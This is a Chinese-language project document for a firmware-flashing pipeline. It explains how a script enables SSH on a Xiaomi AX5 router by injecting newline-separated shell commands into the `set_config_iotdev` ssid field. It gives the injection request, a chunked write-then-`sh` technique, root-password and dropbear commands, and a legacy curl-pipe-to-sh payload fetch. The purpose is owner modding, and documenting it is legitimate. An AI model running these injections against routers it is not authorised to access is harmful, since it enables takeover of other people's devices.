# AX5 SSH 开启（`set_config_iotdev` ssid 注入）

> 核心机制：把命令塞进 Web API 的 ssid 字段，让路由器自己执行。
> **零外部文件服务器**——全部命令通过 stock luci HTTP API 注入。

## 漏洞原理

小米 stock luci 暴露的 `set_config_iotdev` 端点对 ssid 字段做了字符串拼接但**没有过滤换行符**，所以把 ssid 设为：

```
\n<command>\n
```

路由器侧的 C 字符串拼接会把 `\n` 当作换行执行，导致任意 shell 命令以 iotdev 配置脚本上下文运行。

```
POST /cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=\nid\n
```

AX6 的 `3.enable_ssh.py` 用 `smartcontroller` 端点（CVE-2023-26319）做同类注入；AX5 老代码走 HTTP 服务器下载脚本再 `sh`——本项目**直接注入**，不绕路。

## 长度限制与分块策略

| 限制 | 值 | 来源 |
|------|-----|------|
| ssid 字段有效载荷 | **≤ 30 字节** | 实测保守值 |
| 命令字节数（含前后 `\n`）| ≤ 30 | `MAX_SSID_CMD_LEN` |
| 注入 URL 编码后 | 由 nginx/luci 接受，~ 几百字节没事 | 实测 |

`4.enable_ssh.py` 把命令按长度分两种处理：

| 长度 | 策略 | 入口函数 |
|------|------|----------|
| **≤ 30 字节** | 直接塞进 ssid 一次性注入 | `exec_short_cmd()` |
| **> 30 字节** | 分块 `echo -n "..." >>/tmp/e` 写文件，最后 `sh /tmp/e` 执行 | `exec_long_cmd()` |

**分块写入模板**（避开特殊字符 ` " \` $ \n`）：

```bash
echo -n "chunk1" > /tmp/e
echo -n "chunk2" >> /tmp/e
echo -n "chunk3" >> /tmp/e
...
sh /tmp/e
```

每块 ≤ 30 字节，规避 ssid 字段限制。

## 注入命令序列

`4.enable_ssh.py` 实测执行的 4 组命令：

### 阶段 A：nvram 启用 SSH（2 短命令）

```bash
nvram set ssh_en=1     # 18 字节
nvram commit           # 12 字节
```

### 阶段 B：设置 root 密码（3 短命令）

```bash
echo root >/tmp/x       # 17 字节
echo root >>/tmp/x      # 18 字节
passwd root </tmp/x     # 19 字节
```

### 阶段 C：解除 dropbear release 检查（1 长命令 → 5 个短命令拼接）

`dropbear` init 脚本里有一行 `fw_printenv | grep release || return` 在 stock release 上误判失败——**必须 sed 替换**：

```bash
sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear    # 49 字节，超限
```

`4.enable_ssh.py` 把它拆成 4 块 `echo -n "..." >>/tmp/e` 再 `sh /tmp/e`：

```bash
echo -n "sed -i 's/re">/tmp/e
echo -n "lease/XXXXXX">>/tmp/e
echo -n "/g' /etc/ini">>/tmp/e
echo -n "t.d/dropbear">>/tmp/e
sh /tmp/e
```

### 阶段 D：启动 dropbear（2 短命令）

```bash
/etc/init.d/dropbear enable    # 27 字节
/etc/init.d/dropbear restart   # 28 字节
```

### 阶段 E：探测端口 + 清理（自动）

```bash
# TCP 192.168.31.1:22 轮询，3s 一次，最多 10 次（30s）
rm -f /tmp/e /tmp/x    # 19 字节
```

## 与 AX6 方案对比

| 维度 | AX5（本项目）| AX6 |
|------|--------------|-----|
| 注入端点 | `set_config_iotdev` (ssid 字段) | `smartcontroller` (CVE-2023-26319) |
| 漏洞类型 | ssid 字符串换行注入 | smartcontroller auth bypass + 命令执行 |
| 是否需要 HTTP 服务器 | ❌ 不需要 | ❌ 不需要 |
| 是否需要时间操控 | ❌ 不需要 | ✅ 需先调时间绕 hackCheck |
| 是否需要 scene 注入 | ❌ 不需要 | ✅ 需要 |
| 长度限制 | ssid 字段 ≤ 30 字节 | 较宽松 |
| 漏洞触发前置 | stok 即可 | 需要时间窗口 |
| 适合固件范围 | 1.0.26 起所有 stock | 已被修复的版本不行 |

**AX5 方案**比 AX6 **简单得多**——不需要 hackCheck/时间操控/scene 机制，
只需一条 `set_config_iotdev` 调用。

## 固件兼容性

| 固件 | ssid 注入 | 备注 |
|------|-----------|------|
| 1.0.26 | ✅ 实测通过 | `nvram set ssh_en=1` + dropbear 流程正常 |
| 1.4.31 | ❌ 不需要 | stock 1.4.31 已**无**此漏洞（高版本修复了 set_config_iotdev），必须先**降级**到 1.0.26 才能注入 |

**因此降级阶段 3 是 AX5 流水线的必经步骤**——`3.downgrade.py` 存在的原因就是 1.4.31 屏蔽了 ssid 注入漏洞。

## 失败模式

| 表现 | 原因 | 修法 |
|------|------|------|
| `命令过长 (XX > 30)` 报错 | 短命令接口收到 > 30 字节命令 | 应走长命令路径分块执行——脚本内部已处理 |
| 注入 HTTP 200 但命令未执行 | stok 失效 | 重跑 `2.login_get_stok.py` 取新 stok |
| dropbear 启动后 22 端口仍 closed | release 检查卡住 | 检查 sed 是否执行——用 `--debug` 看分块写入日志 |
| passwd 阶段死循环 | `/tmp/x` 文件 IO 失败 | 手动 SSH 看 `ls -la /tmp/x` |

## 与外部工具的协同

`4.enable_ssh.py` **不依赖**外部 HTTP 服务器（不像老代码 `enable_ssh.py` 要起一个 Python HTTP server）：

```bash
# 老代码（已废弃）：
python3 enable_ssh.py --local-ip 192.168.31.100   # 起 HTTP server 喂脚本
# 通过 ssid 注入 curl http://192.168.31.100/payload.sh | sh
```

```bash
# 新项目（本项目）：
python3 4.enable_ssh.py --stok "$STOK"  # 0 外部依赖
```

`miwifi_ssh.sh` 包装的 SSH 连接参数（`HostKeyAlgorithms=+ssh-rsa`）在 stock 1.0.26 dropbear 上必需；切到 OpenWrt 后用 `192.168.1.1` + ED25519 即可。

## 关联文档

- [flash-pipeline.md](flash-pipeline.md) — 流水线中的位置（阶段 3）
- [model-info.md](model-info.md) — 加密参数、MTD 布局
- [troubleshooting.md](troubleshooting.md) — `command_too_long` / `inject_failed` 等 reason 处理
